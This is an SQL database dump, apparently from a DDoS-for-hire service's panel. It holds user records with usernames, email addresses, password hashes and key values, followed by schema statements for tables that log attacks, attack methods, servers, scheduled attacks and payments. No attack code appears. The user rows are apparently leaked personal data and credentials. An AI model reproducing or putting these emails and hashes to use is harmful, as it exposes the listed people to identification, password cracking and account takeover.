(31285, 'Cas171945', 'bd9612dc9b03405ae4a5e0270390919ddf4b26a1', 'cas@gmail.com', 'be4dabead337fccc', 'User', 61, 1747641070, 1, 0, '0', 0, 0, 0, '0', '2025-04-03 02:50:47.000000', '2025-04-24 16:06:46'),
(31291, 'xxxcel', '943aabbcada62427b864780d07a52ce25b75f225', 'excelthai666@gmail.com', 'ce1b6741fb75e471', 'User', 61, 1747641062, 1, 0, '0', 0, 0, 0, '0', '2025-04-03 08:43:29.000000', '2025-04-24 15:48:18'),
(31301, 'akbarr', '01ef6c086ce594b0077c9851a2689aec459cadd4', 'ceoyoshi@gmail.com', '6fe16122baaeb0b9', 'User', 0, 0, 1, 0, '0', 0, 0, 0, '20', '2025-04-04 14:04:07.000000', '2025-04-07 11:02:05'),
(31305, 'furina', '22633520cedc2c4d9dbc47fcccd4e4e68bfb906f', 'furina@3xploit.dev', '9177dbf781b710a9', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-05 04:29:28.000000', '2025-04-11 08:01:09'),
(31327, 'tinmauplangrati', '6dfb57d4d331cd5dd5122e0cae8305dad8ad8a11', 'kontolgimang@gmail.com', 'ff4cbd719fee82ed', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-12 06:53:11.000000', '2025-04-12 06:53:11'),
(31328, 'XbibzOfficial', '5c2698eaa1c9cbd9237c19f3b8f6a2d2e545dab7', 'guebarbar12@gmail.com', 'cb6636377ad61b01', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-12 07:07:50.000000', '2025-04-12 07:07:50'),
(31329, 'tempek', '8726d3c19e741fe2fdb47036a7abd3d3f5477329', 'ihsan83636@gmail.com', '65f243fbcb56604a', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-13 06:32:55.000000', '2025-04-13 06:32:55'),
(31330, 'hai123', '1905752d28a9febfaa9ef8e5b79d08ba00566393', 'bram@flexynode.com', '02097e89dbd4c85f', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-14 09:57:13.000000', '2025-04-14 15:58:15'),
(31331, 'alokkkk', 'd465bba8cde7912daefea64ac7f52fe5bf84c69d', 'alokkopling123@gmail.com', '20b4233c5410aa2c', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-14 14:51:51.000000', '2025-04-14 14:51:51'),
(31332, 'Mangku', '1755762065c607304bedf01f19040b3efeff53e7', 'mangkubalangko@gmail.com', '4fcc7ace9bb7e673', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-15 00:37:50.000000', '2025-04-15 00:37:50'),
(31333, 'majoranon', '1fb586718403e6b398655502d2114f5ac27badd1', 'abcv1234@gmail.com', 'b0c52e5edd684de4', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-15 06:15:01.000000', '2025-04-15 06:15:01'),
(31334, 'kisaboi', '1c32e0662e0a62d7abac61358fbc9b464f93ffe9', 'kisa0142@gmail.com', '87a8f519887de94e', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-15 23:30:31.000000', '2025-04-15 23:30:31'),
(31335, 'Akaforty', '21eef797c7aec21468c1ce65a2ce5af472a4eca3', 'azharariari57@gmail.com', '5f822d7ae6717fb1', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-16 15:37:03.000000', '2025-04-17 14:53:05'),
(31336, 'kahfimoodtzyy', 'fb6b5dcc0e72b336641716dfaf0272743bc9beed', 'kahmoodtzyy@gmail.com', 'cff2b8ba738c53ba', 'User', 59, 1747488669, 0, 0, '0', 0, 0, 0, '0', '2025-04-17 09:29:12.000000', '2025-04-17 09:29:12'),
(31337, 'jawaaaa', '1f82ea75c5cc526729e2d581aeb3aeccfef4407e', 'jawa@g.co', '69d0a6dc20e3eaf1', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-17 10:34:30.000000', '2025-04-17 10:34:30'),
(31338, 'apinnn', '713b054634d891e0cb7a4f74e9558f4efe92df0c', 'nerakabang@gmail.com', 'b1cfb6ab7aa5269f', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-17 19:40:56.000000', '2025-04-17 19:40:56'),
(31339, 'kontol', '1995ca47b789859efaa9dae340e75cf24cd83d25', 'zyrexgntng@gmail.com', '9e89b49f519d20d8', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-18 07:16:00.000000', '2025-04-18 07:16:00'),
(31340, 'putraa', '8ae4ab2a40ce1b16678fa2c39851bee7cc96ff50', 'putraalghifary12@gmail.com', 'c9d0fb9285a20df8', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-18 08:21:04.000000', '2025-04-18 08:21:04'),
(31341, 'apalah', '335d7c6c2b62dff18ff1aeb61095a024a9cb3414', 'Fuck@gmail.com', 'c6e1af489638fdae', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-18 10:13:20.000000', '2025-04-18 10:13:20'),
(31342, 'eunsoobf', '1042c8b759edb7cd785f2a80296421e67960827e', 'youjikagura@gmail.com', '39f03d8d9479f90c', 'User', 61, 1747641088, 0, 0, '0', 0, 0, 0, '0', '2025-04-19 03:35:40.000000', '2025-04-24 17:21:56'),
(31343, 'renzzsenpai', '34f946f360701dd0afbc4739913d1129eeaedb03', 'hamizrafa79@gmail.com', '7f5e633e5e865aef', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-19 08:32:01.000000', '2025-04-19 08:32:01'),
(31344, 'rexxysigmaa', 'c0d42e09e11653fac28dcfb54deb79540407a7e8', 'kondisi575@gmail.com', '49e07cc5d3497dd2', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-19 12:24:15.000000', '2025-04-19 12:24:15'),
(31345, 'James210', '592bf90bb3c01283a81666abc212d94591148419', 'managerj.chatgpt@gmail.com', '3e93693080df17e0', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-19 20:29:55.000000', '2025-04-19 20:29:55'),
(31346, 'keymol', '468e72b86278699702265dbe5877d4934dbb2e39', 'malezplaybg@gmail.com', '633f1b91fb0a8ead', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-19 23:33:26.000000', '2025-04-19 23:33:26'),
(31347, 'Kontoltree', '6b92422ad165f6199163bd53649608dfae6376cd', 'jbstoree87@gmail.com', 'eb05234f0c75c782', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-20 02:42:00.000000', '2025-04-20 02:42:00'),
(31348, 'liuxingyu55', '6a4e6ce2047dc5b8b7de292514f605e0c98efafd', 'yxymknet@yxymk.com', '077a2a3b44430268', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-20 12:26:35.000000', '2025-04-20 12:26:35'),
(31349, 'andidiyantara', '5018bcf558fd4a3d3cdd64770ce333e01a1d30a0', 'andstore706@gmail.com', 'cb70fd65792ffee9', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-21 03:37:04.000000', '2025-04-21 09:46:14'),
(31350, 'Varanisko', '74ba07604dc750c0084fc6b63a7a41fbc4097223', 'nemamradcernyy3@gmail.com', 'cab0515585c4706b', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-21 07:39:42.000000', '2025-04-21 07:39:42'),
(31351, 'admin1234', '036d0ef7567a20b5a4ad24a354ea4a945ddab676', 'fomodas224@asaption.com', '3acedeca0c53a598', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-21 09:01:06.000000', '2025-04-21 18:58:33'),
(31352, 'lucass', '27d9665ce064e894e54de271977675d022e72696', 'maklu@gmail.com', '3a2d2ab6a5f34764', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-21 14:27:58.000000', '2025-04-21 14:27:58'),
(31353, 'nakamae', '79236a2f378dd52d7752b81da5d849232e930972', 'foyed26048@asaption.com', 'ec205e8b11e9093c', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-21 23:21:29.000000', '2025-04-21 23:21:29'),
(31354, 'Zjonch', '13ec01ac5ec3b978aa319bc838beedddaf3ab0b9', 'zjonch@gmail.com', '38b5d8b3c6ae525b', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-22 14:23:16.000000', '2025-04-22 14:23:16'),
(31355, 'Zyrexxx', 'c7ca5eecdbfe481b88253245f3666461c0fbf659', 'zyrex6613@gmail.com', '6aa8e54fe59722f2', 'User', 60, 1748003591, 0, 0, '0', 0, 0, 0, '0', '2025-04-23 08:16:01.000000', '2025-04-24 19:08:32'),
(31356, 'pameongw', 'ec70a91a86e23942607311174200fe223a8bcae6', 'pameongw@gmail.com', 'a6d266be391c3bfd', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-23 19:03:29.000000', '2025-04-23 19:03:29'),
(31357, 'bibskyy', '552b5d2212eb7c8983c947d39f92c8e5fa2d0b94', 'garaamarka88@gmail.com', '7d063cb81a160399', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-24 10:38:13.000000', '2025-04-24 10:38:13'),
(31358, 'vinzzz', 'fee49ded86395374e6d5a60cdbefdb8c03d70f1f', 'garaamarka@gmail.com', 'baf15e9713be47b1', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-24 10:45:10.000000', '2025-04-24 10:45:10'),
(31359, 'Koala522', '802549e5299f9dd3ef7ccee9c97449ba0210b3d9', 'panelddos17@gmail.com', 'ad83fd01509a9c75', 'User', 0, 1767283020, 0, 0, '0', 0, 0, 0, '0', '2025-04-24 13:28:51.000000', '2025-04-24 13:28:51');

--
-- Indexes for dumped tables
--

--
-- Indeks untuk tabel `addons`
--
ALTER TABLE `addons`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `addon_coupons`
--
ALTER TABLE `addon_coupons`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `apikeys`
--
ALTER TABLE `apikeys`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `attacklogs`
--
ALTER TABLE `attacklogs`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `bans`
--
ALTER TABLE `bans`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `blacklist`
--
ALTER TABLE `blacklist`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `coupons`
--
ALTER TABLE `coupons`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `methods`
--
ALTER TABLE `methods`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `notifications`
--
ALTER TABLE `notifications`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `payments`
--
ALTER TABLE `payments`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `plans`
--
ALTER TABLE `plans`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `plan_purchases`
--
ALTER TABLE `plan_purchases`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `servers`
--
ALTER TABLE `servers`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `sheduledattacks`
--
ALTER TABLE `sheduledattacks`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `tickets`
--
ALTER TABLE `tickets`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `tickets_replies`
--
ALTER TABLE `tickets_replies`
  ADD PRIMARY KEY (`id`);

--
-- Indeks untuk tabel `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT untuk tabel yang dibuang
--

--
-- AUTO_INCREMENT untuk tabel `addons`
--
ALTER TABLE `addons`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT untuk tabel `addon_coupons`
--
ALTER TABLE `addon_coupons`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `apikeys`
--
ALTER TABLE `apikeys`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `attacklogs`
--
ALTER TABLE `attacklogs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=268588;

--
-- AUTO_INCREMENT untuk tabel `bans`
--
ALTER TABLE `bans`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- AUTO_INCREMENT untuk tabel `blacklist`
--
ALTER TABLE `blacklist`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=165;

--
-- AUTO_INCREMENT untuk tabel `coupons`
--
ALTER TABLE `coupons`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT untuk tabel `methods`
--
ALTER TABLE `methods`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=135;

--
-- AUTO_INCREMENT untuk tabel `news`
--
ALTER TABLE `news`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;

--
-- AUTO_INCREMENT untuk tabel `notifications`
--
ALTER TABLE `notifications`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT untuk tabel `payments`
--
ALTER TABLE `payments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=268;

--
-- AUTO_INCREMENT untuk tabel `plans`
--
ALTER TABLE `plans`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=66;

--
-- AUTO_INCREMENT untuk tabel `plan_purchases`
--
ALTER TABLE `plan_purchases`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;

--
-- AUTO_INCREMENT untuk tabel `servers`
--
ALTER TABLE `servers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=360;

--
-- AUTO_INCREMENT untuk tabel `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT untuk tabel `sheduledattacks`
--
ALTER TABLE `sheduledattacks`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT untuk tabel `tickets`
--
ALTER TABLE `tickets`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=28;

--
-- AUTO_INCREMENT untuk tabel `tickets_replies`
--
ALTER TABLE `tickets_replies`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT untuk tabel `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31360;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
